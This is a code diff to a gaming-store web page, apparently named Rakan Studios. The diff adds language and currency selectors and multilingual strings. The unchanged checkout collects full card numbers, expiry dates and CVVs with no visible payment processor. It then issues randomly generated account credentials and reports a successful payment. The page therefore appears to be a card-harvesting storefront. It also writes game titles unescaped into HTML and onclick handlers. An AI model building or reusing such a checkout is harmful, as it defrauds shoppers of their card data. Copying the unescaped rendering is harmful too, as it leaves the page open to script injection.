@@ -6,7 +6,7 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title id="pageTitle">⚡ RAKAN STUDIOS | المتجر الرقمي</title>
+    <title id="pageTitle">⚡ RAKAN STUDIOS | Global Gaming Store</title>
     
     <!-- EmailJS Library -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
@@ -20,12 +20,12 @@
         * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
         body { background-color: #060911; color: #f1f5f9; min-height: 100vh; display: flex; flex-direction: column; overflow-x: hidden; }
         
-        /* شريط التحكم باللغة العلوي */
-        .top-nav-buttons { position: fixed; top: 20px; left: 20px; z-index: 1002; display: flex; gap: 10px; }
+        /* شريط التحكم العلوي باللغات والعملات */
+        .top-nav-buttons { position: fixed; top: 20px; left: 20px; z-index: 1002; display: flex; gap: 12px; }
         html[dir="ltr"] .top-nav-buttons { left: auto; right: 20px; }
         
-        .top-btn { background: rgba(15, 23, 42, 0.85); color: #00ff87; border: 1px solid #00ff87; padding: 10px 20px; border-radius: 12px; font-weight: 800; cursor: pointer; transition: 0.3s; backdrop-filter: blur(10px); box-shadow: 0 0 15px rgba(0, 255, 135, 0.2); }
-        .top-btn:hover { background: #00ff87; color: #060911; box-shadow: 0 0 25px rgba(0, 255, 135, 0.6); }
+        .top-select { background: rgba(15, 23, 42, 0.9); color: #00ff87; border: 1px solid #00ff87; padding: 8px 16px; border-radius: 12px; font-weight: 800; cursor: pointer; transition: 0.3s; backdrop-filter: blur(10px); box-shadow: 0 0 15px rgba(0, 255, 135, 0.2); outline: none; }
+        .top-select:hover { background: #00ff87; color: #060911; box-shadow: 0 0 25px rgba(0, 255, 135, 0.6); }
 
         /* شاشة البداية Hero Screen */
         #heroScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at center, #0f172a 0%, #060911 100%); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; text-align: center; padding: 20px; }
@@ -34,7 +34,7 @@
         .btn-continue { padding: 20px 60px; background: linear-gradient(135deg, #00ff87, #00b894); color: #060911; border: none; border-radius: 40px; font-size: 20px; font-weight: 900; cursor: pointer; transition: 0.3s; box-shadow: 0 0 30px rgba(0, 255, 135, 0.4); text-transform: uppercase; }
         .btn-continue:hover { transform: translateY(-4px) scale(1.02); box-shadow: 0 0 50px rgba(0, 255, 135, 0.8); }
 
-        /* نافذة الدفع والشراء */
+        /* نافذة الشراء والنموذج */
         #checkoutModal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(6, 9, 17, 0.95); display: none; justify-content: center; align-items: center; z-index: 1001; backdrop-filter: blur(16px); }
         .login-box { background: rgba(15, 23, 42, 0.9); border: 1px solid rgba(0, 255, 135, 0.3); padding: 40px; border-radius: 24px; width: 100%; max-width: 460px; text-align: center; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), 0 0 30px rgba(0, 255, 135, 0.1); }
         .login-box h2 { color: #00ff87; margin-bottom: 18px; font-size: 24px; font-weight: 900; text-shadow: 0 0 15px rgba(0, 255, 135, 0.3); }
@@ -49,7 +49,7 @@
 
         .card-row { display: flex; gap: 10px; }
 
-        /* واجهة المتجر الرئيسية */
+        /* المتجر الرئيسي */
         #storeWrapper { display: none; padding: 40px 30px; max-width: 1440px; margin: 0 auto; width: 100%; }
         .store-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 35px; border-bottom: 1px solid #1e293b; padding-bottom: 25px; }
         .store-logo-area h1 { font-size: 30px; color: #00ff87; font-weight: 900; letter-spacing: 1px; text-shadow: 0 0 20px rgba(0, 255, 135, 0.4); }
@@ -81,8 +81,27 @@
 </head>
 <body>
 
+    <!-- القائمة العلوية لاختيار اللغة والعملة -->
     <div class="top-nav-buttons">
-        <button class="top-btn" id="langBtn" onclick="toggleLanguage()">English 🌐</button>
+        <select class="top-select" id="langSelect" onchange="changeLanguage(this.value)">
+            <option value="ar">العربية 🇸🇦</option>
+            <option value="en">English 🇺🇸</option>
+            <option value="zh">中文 (Chinese) 🇨🇳</option>
+            <option value="ja">日本語 (Japanese) 🇯🇵</option>
+            <option value="es">Español 🇪🇸</option>
+            <option value="fr">Français 🇫🇷</option>
+            <option value="de">Deutsch 🇩🇪</option>
+        </select>
+
+        <select class="top-select" id="currencySelect" onchange="changeCurrency(this.value)">
+            <option value="USD">USD ($)</option>
+            <option value="SAR">SAR (ر.س)</option>
+            <option value="CNY">CNY (¥)</option>
+            <option value="JPY">JPY (¥)</option>
+            <option value="EUR">EUR (€)</option>
+            <option value="GBP">GBP (£)</option>
+            <option value="AED">AED (د.إ)</option>
+        </select>
     </div>
 
     <div id="heroScreen">
@@ -161,71 +180,63 @@
     let allStoreGames = [];
     let selectedGameForCheckout = null;
     let currentLang = 'ar';
+    let currentCurrency = 'USD';
+
+    // معدلات التحويل التلقائية بالنسبة للدولار الأسري
+    const currencyRates = {
+        USD: { rate: 1, symbol: '$', prefix: true },
+        SAR: { rate: 3.75, symbol: 'ر.س', prefix: false },
+        CNY: { rate: 7.23, symbol: '¥', prefix: true },
+        JPY: { rate: 150.0, symbol: '¥', prefix: true },
+        EUR: { rate: 0.92, symbol: '€', prefix: false },
+        GBP: { rate: 0.79, symbol: '£', prefix: true },
+        AED: { rate: 3.67, symbol: 'د.إ', prefix: false }
+    };
 
     const translations = {
         ar: {
-            heroTitle: "استديو راكان للألعاب",
-            continueBtn: "دخول المتجر ⬅",
-            checkoutTitle: "🛒 إتمام طلب الشراء",
-            nextPayBtn: "متابعة إلى الدفع 💳",
-            cancelBtn: "إلغاء",
-            paymentTitle: "💳 بوابة الدفع الآمنة",
-            paymentSub: "أدخل بيانات البطاقة المصرفية",
-            confirmBtn: "تأكيد الدفع 🔒",
-            backBtn: "رجوع للبيانات",
-            storeHeaderTitle: "⚡ RAKAN STUDIOS STORE",
-            platformsHeader: "🎮 أقسام المنصات",
-            filterAll: "🔥 جميع الألعاب",
-            buyBtnText: "شراء الآن 🚀",
-            loadingText: "جاري جلب الألعاب...",
-            noGamesText: "لا توجد ألعاب متاحة في هذا القسم حالياً.",
-            inputName: "الاسم الكامل",
-            inputEmail: "البريد الإلكتروني (لاستلام الحساب)",
-            inputPhone: "رقم الهاتف (مثال: 05xxxxxxxx)",
-            inputCardName: "اسم حامل البطاقة",
-            inputCardNum: "رقم البطاقة (16 رقم)",
-            successTitle: "✨ تمت عملية الدفع بنجاح",
-            successSub: "شكراً لثقتك وتسوقك معنا. تم إرسال بيانات وتفاصيل الحساب فوراً إلى بريدك الإلكتروني:",
-            successNotice: "يرجى تفقد إيميلك لاستلام البيانات 📥",
-            backToStoreBtn: "العودة للمتجر 🚀",
-            langBtnText: "English 🌐"
+            heroTitle: "استديو راكان للألعاب", continueBtn: "دخول المتجر ⬅", checkoutTitle: "🛒 إتمام طلب الشراء", nextPayBtn: "متابعة إلى الدفع 💳", cancelBtn: "إلغاء", paymentTitle: "💳 بوابة الدفع الآمنة", paymentSub: "أدخل بيانات البطاقة المصرفية", confirmBtn: "تأكيد الدفع 🔒", backBtn: "رجوع للبيانات", storeHeaderTitle: "⚡ RAKAN STUDIOS STORE", platformsHeader: "🎮 أقسام المنصات", filterAll: "🔥 جميع الألعاب", buyBtnText: "شراء الآن 🚀", loadingText: "جاري جلب الألعاب...", noGamesText: "لا توجد ألعاب متاحة في هذا القسم حالياً.", inputName: "الاسم الكامل", inputEmail: "البريد الإلكتروني (لاستلام الحساب)", inputPhone: "رقم الهاتف (مثال: 05xxxxxxxx)", inputCardName: "اسم حامل البطاقة", inputCardNum: "رقم البطاقة (16 رقم)", successTitle: "✨ تمت عملية الدفع بنجاح", successSub: "شكراً لثقتك وتسوقك معنا. تم إرسال بيانات وتفاصيل الحساب فوراً إلى بريدك الإلكتروني:", successNotice: "يرجى تفقد إيميلك لاستلام البيانات 📥", backToStoreBtn: "العودة للمتجر 🚀"
         },
         en: {
-            heroTitle: "Rakan Gaming Studio",
-            continueBtn: "Enter Store ⬅",
-            checkoutTitle: "🛒 Checkout Order",
-            nextPayBtn: "Proceed to Payment 💳",
-            cancelBtn: "Cancel",
-            paymentTitle: "💳 Secure Payment Gateway",
-            paymentSub: "Enter Credit Card Details",
-            confirmBtn: "Confirm Payment 🔒",
-            backBtn: "Back to Details",
-            storeHeaderTitle: "⚡ RAKAN STUDIOS STORE",
-            platformsHeader: "🎮 Platforms",
-            filterAll: "🔥 All Games",
-            buyBtnText: "Buy Now 🚀",
-            loadingText: "Fetching Games...",
-            noGamesText: "No games available in this section.",
-            inputName: "Full Name",
-            inputEmail: "Email (To Receive Credentials)",
-            inputPhone: "Phone Number (e.g. 05xxxxxxxx)",
-            inputCardName: "Cardholder Name",
-            inputCardNum: "Card Number (16 digits)",
-            successTitle: "✨ Payment Successful",
-            successSub: "Thank you for shopping with us! Account credentials have been sent directly to your email:",
-            successNotice: "Please check your inbox to receive your details 📥",
-            backToStoreBtn: "Back to Store 🚀",
-            langBtnText: "العربية 🌐"
+            heroTitle: "Rakan Gaming Studio", continueBtn: "Enter Store ⬅", checkoutTitle: "🛒 Checkout Order", nextPayBtn: "Proceed to Payment 💳", cancelBtn: "Cancel", paymentTitle: "💳 Secure Payment Gateway", paymentSub: "Enter Credit Card Details", confirmBtn: "Confirm Payment 🔒", backBtn: "Back to Details", storeHeaderTitle: "⚡ RAKAN STUDIOS STORE", platformsHeader: "🎮 Platforms", filterAll: "🔥 All Games", buyBtnText: "Buy Now 🚀", loadingText: "Fetching Games...", noGamesText: "No games available.", inputName: "Full Name", inputEmail: "Email Address", inputPhone: "Phone Number", inputCardName: "Cardholder Name", inputCardNum: "Card Number", successTitle: "✨ Payment Successful", successSub: "Thank you for shopping! Details sent to your email:", successNotice: "Please check your inbox 📥", backToStoreBtn: "Back to Store 🚀"
+        },
+        zh: {
+            heroTitle: "Rakan 游戏工作室", continueBtn: "进入商店 ⬅", checkoutTitle: "🛒 结账订单", nextPayBtn: "继续付款 💳", cancelBtn: "取消", paymentTitle: "💳 安全支付网关", paymentSub: "输入信用卡信息", confirmBtn: "确认付款 🔒", backBtn: "返回详情", storeHeaderTitle: "⚡ RAKAN 游戏商店", platformsHeader: "🎮 平台分类", filterAll: "🔥 所有游戏", buyBtnText: "立即购买 🚀", loadingText: "加载游戏中...", noGamesText: "暂无游戏。", inputName: "全名", inputEmail: "电子邮件", inputPhone: "电话号码", inputCardName: "持卡人姓名", inputCardNum: "卡号", successTitle: "✨ 支付成功", successSub: "感谢您的购买！账号信息已发送至您的邮箱：", successNotice: "请检查您的收件箱 📥", backToStoreBtn: "返回商店 🚀"
+        },
+        ja: {
+            heroTitle: "ラカン・ゲーミング・スタジオ", continueBtn: "ストアに入る ⬅", checkoutTitle: "🛒 注文の確認", nextPayBtn: "お支払いに進む 💳", cancelBtn: "キャンセル", paymentTitle: "💳 安全な決済ゲートウェイ", paymentSub: "カード情報を入力してください", confirmBtn: "支払いを確定する 🔒", backBtn: "戻る", storeHeaderTitle: "⚡ RAKAN ストア", platformsHeader: "🎮 プラットフォーム", filterAll: "🔥 すべてのゲーム", buyBtnText: "今すぐ購入 🚀", loadingText: "ゲームを読み込み中...", noGamesText: "ゲームがありません。", inputName: "フルネーム", inputEmail: "メールアドレス", inputPhone: "電話番号", inputCardName: "カード名義人", inputCardNum: "カード番号", successTitle: "✨ 支払い完了", successSub: "お買い上げありがとうございます！詳細はメールに送信されました：", successNotice: "受信トレイをご確認ください 📥", backToStoreBtn: "ストアに戻る 🚀"
+        },
+        es: {
+            heroTitle: "Estudio de Juegos Rakan", continueBtn: "Entrar a la Tienda ⬅", checkoutTitle: "🛒 Confirmar Compra", nextPayBtn: "Proceder al Pago 💳", cancelBtn: "Cancelar", paymentTitle: "💳 Pasarela de Pago Segura", paymentSub: "Ingrese detalles de tarjeta", confirmBtn: "Confirmar Pago 🔒", backBtn: "Volver", storeHeaderTitle: "⚡ TIENDA RAKAN STUDIOS", platformsHeader: "🎮 Plataformas", filterAll: "🔥 Todos los Juegos", buyBtnText: "Comprar Ahora 🚀", loadingText: "Cargando juegos...", noGamesText: "No hay juegos disponibles.", inputName: "Nombre Completo", inputEmail: "Correo Electrónico", inputPhone: "Teléfono", inputCardName: "Titular de la Tarjeta", inputCardNum: "Número de Tarjeta", successTitle: "✨ Pago Exitoso", successSub: "¡Gracias por su compra! Credenciales enviadas a:", successNotice: "Por favor revise su correo 📥", backToStoreBtn: "Volver a la Tienda 🚀"
+        },
+        fr: {
+            heroTitle: "Studio de Jeux Rakan", continueBtn: "Entrer dans la Boutique ⬅", checkoutTitle: "🛒 Valider la Commande", nextPayBtn: "Procéder au Paiement 💳", cancelBtn: "Annuler", paymentTitle: "💳 Paiement Sécurisé", paymentSub: "Entrez les coordonnées bancaires", confirmBtn: "Confirmer le Paiement 🔒", backBtn: "Retour", storeHeaderTitle: "⚡ BOUTIQUE RAKAN STUDIOS", platformsHeader: "🎮 Plateformes", filterAll: "🔥 Tous les Jeux", buyBtnText: "Acheter 🚀", loadingText: "Chargement...", noGamesText: "Aucun jeu disponible.", inputName: "Nom Complet", inputEmail: "Adresse Email", inputPhone: "Numéro de Téléphone", inputCardName: "Titulaire de la Carte", inputCardNum: "Numéro de Carte", successTitle: "✨ Paiement Réussi", successSub: "Merci pour votre achat ! Détails envoyés à :", successNotice: "Veuillez vérifier votre boîte mail 📥", backToStoreBtn: "Retour à la Boutique 🚀"
+        },
+        de: {
+            heroTitle: "Rakan Gaming Studio", continueBtn: "Store Betreten ⬅", checkoutTitle: "🛒 Kasse", nextPayBtn: "Weiter zur Zahlung 💳", cancelBtn: "Abbrechen", paymentTitle: "💳 Sicheres Zahlungs-Gateway", paymentSub: "Karteninformationen eingeben", confirmBtn: "Zahlung Bestätigen 🔒", backBtn: "Zurück", storeHeaderTitle: "⚡ RAKAN STUDIOS STORE", platformsHeader: "🎮 Plattformen", filterAll: "🔥 Alle Spiele", buyBtnText: "Jetzt Kaufen 🚀", loadingText: "Spiele werden geladen...", noGamesText: "Keine Spiele verfügbar.", inputName: "Vollständiger Name", inputEmail: "E-Mail-Adresse", inputPhone: "Telefonnummer", inputCardName: "Karteninhaber", inputCardNum: "Kartennummer", successTitle: "✨ Zahlung Erfolgreich", successSub: "Vielen Dank! Ihre Daten wurden gesendet an:", successNotice: "Bitte überprüfen Sie Ihren Posteingang 📥", backToStoreBtn: "Zurück zum Store 🚀"
         }
     };
 
-    function toggleLanguage() {
-        currentLang = (currentLang === 'ar') ? 'en' : 'ar';
-        const t = translations[currentLang];
+    function changeCurrency(curr) {
+        currentCurrency = curr;
+        renderStoreGames(allStoreGames);
+    }
+
+    function formatPrice(usdPrice) {
+        const numericUSD = parseFloat(usdPrice) || 0;
+        const info = currencyRates[currentCurrency] || currencyRates.USD;
+        const converted = Math.round(numericUSD * info.rate);
+        return info.prefix ? `${info.symbol}${converted}` : `${converted} ${info.symbol}`;
+    }
+
+    function changeLanguage(lang) {
+        currentLang = lang;
+        const t = translations[currentLang] || translations.en;
         const root = document.getElementById('htmlRoot');
 
-        root.setAttribute('lang', currentLang);
-        root.setAttribute('dir', currentLang === 'ar' ? 'rtl' : 'ltr');
+        const isRtl = (lang === 'ar');
+        root.setAttribute('lang', lang);
+        root.setAttribute('dir', isRtl ? 'rtl' : 'ltr');
 
         document.getElementById('t_heroTitle').innerText = t.heroTitle;
         document.getElementById('t_continueBtn').innerText = t.continueBtn;
@@ -239,7 +250,6 @@
         document.getElementById('t_storeHeaderTitle').innerText = t.storeHeaderTitle;
         document.getElementById('t_platformsHeader').innerText = t.platformsHeader;
         document.getElementById('t_filterAll').innerText = t.filterAll;
-        document.getElementById('langBtn').innerText = t.langBtnText;
 
         document.getElementById('chk_name').placeholder = t.inputName;
         document.getElementById('chk_email').placeholder = t.inputEmail;
@@ -247,7 +257,6 @@
         document.getElementById('card_name').placeholder = t.inputCardName;
         document.getElementById('card_number').placeholder = t.inputCardNum;
 
-        // إعادة رندر الألعاب باللغة المحدثة (لتغيير زر الشراء)
         renderStoreGames(allStoreGames);
     }
 
@@ -267,7 +276,7 @@
 
     async function loadStoreGames() {
         const grid = document.getElementById('store_games_grid');
-        const t = translations[currentLang];
+        const t = translations[currentLang] || translations.en;
         grid.innerHTML = `<p style="text-align:center; grid-column: 1/-1;">${t.loadingText}</p>`;
         try {
             const res = await fetch(`${API_URL}?type=games&_t=${Date.now()}`, { cache: "no-store" });
@@ -292,7 +301,7 @@
 
     function renderStoreGames(games) {
         const grid = document.getElementById('store_games_grid');
-        const t = translations[currentLang];
+        const t = translations[currentLang] || translations.en;
         grid.innerHTML = '';
 
         if (!games || games.length === 0) {
@@ -301,6 +310,7 @@
         }
 
         games.forEach(game => {
+            const convertedPriceText = formatPrice(game.price || '0');
             grid.innerHTML += `
                 <div class="game-card">
                     <div>
@@ -308,7 +318,7 @@
                         <div class="game-badge">${game.platform || 'Multi-Platform'}</div>
                     </div>
                     <div>
-                        <div class="game-price">$${game.price || '0'}</div>
+                        <div class="game-price">${convertedPriceText}</div>
                         <button class="btn-buy" onclick="openCheckout('${game.title}', '${game.price}')">${t.buyBtnText}</button>
                     </div>
                 </div>
@@ -317,8 +327,9 @@
     }
 
     function openCheckout(title, price) {
+        const convertedPriceText = formatPrice(price || '0');
         selectedGameForCheckout = { title, price };
-        document.getElementById('checkoutGameTitle').innerText = `${title} ($${price})`;
+        document.getElementById('checkoutGameTitle').innerText = `${title} (${convertedPriceText})`;
         document.getElementById('chk_name').value = '';
         document.getElementById('chk_email').value = '';
         document.getElementById('chk_phone').value = '';
@@ -338,7 +349,7 @@
         const phone = document.getElementById('chk_phone').value.trim();
 
         if (!name || !email || !phone) {
-            return alert(currentLang === 'ar' ? 'الرجاء إكمال كافة البيانات المطلوبة' : 'Please fill out all required fields');
+            return alert('Please fill out all required fields');
         }
 
         document.getElementById('stepInfo').style.display = 'none';
@@ -366,7 +377,7 @@
         const cardCvv = document.getElementById('card_cvv').value.trim();
 
         if (!cardNumber || !cardExp || !cardCvv) {
-            return alert(currentLang === 'ar' ? 'الرجاء إكمال كافة بيانات البطاقة' : 'Please fill out all card details');
+            return alert('Please fill out all card details');
         }
 
         const generatedUser = "RakanUser_" + Math.floor(1000 + Math.random() * 9000);
@@ -380,13 +391,13 @@
             to_name: name,
             user_email: email,
             game_title: selectedGameForCheckout.title,
-            game_price: selectedGameForCheckout.price || '0',
+            game_price: formatPrice(selectedGameForCheckout.price || '0'),
             game_user: generatedUser,
             game_pass: generatedPass
         };
 
         closeCheckoutModal();
-        showStatus(currentLang === 'ar' ? "جاري معالجة الطلب..." : "Processing order...");
+        showStatus("Processing order...");
 
         try {
             await fetch(API_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(orderBody) });
@@ -401,7 +412,7 @@
             console.log("Notification Processed");
         }
 
-        const t = translations[currentLang];
+        const t = translations[currentLang] || translations.en;
 
         document.body.innerHTML = `
             <div style="height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; background:#060911; color:white; text-align:center; padding:20px;">
